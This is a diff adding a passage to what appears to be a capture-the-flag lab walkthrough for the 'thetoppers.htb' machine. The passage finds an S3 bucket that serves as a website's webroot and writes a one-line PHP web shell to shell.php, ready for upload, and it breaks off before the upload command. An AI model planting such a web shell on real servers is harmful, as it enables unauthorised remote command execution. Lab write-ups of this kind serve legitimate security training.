@@ -47,6 +47,30 @@ We can list all of the S3 buckets hosted by the server by using the ls command.
 
 **aws --endpoint=http://s3.thetoppers.htb s3 ls**
 
+We see the files index.php , .htaccess and a directory called images in the specified bucket. It seems like
+this is the webroot of the website running on port 80 . So the Apache server is using this S3 bucket as
+storage.
+
+**awscli** has got another feature that allows us to copy files to a remote bucket. We already know that the
+website is using PHP. Thus, we can try uploading a PHP shell file to the S3 bucket and since it's uploaded to
+the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
+will achieve remote code execution.
+
+
+We can use the following PHP one-liner which uses the system() function which takes the URL parameter
+cmd as an input and executes it as a system command.
+
+**<?php system($_GET["cmd"]); ?>**
+
+then make file php 
+
+**echo '<?php system($_GET["cmd"]); ?>' > shell.php**
+
+Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command
+
+
+
+
 
 
 
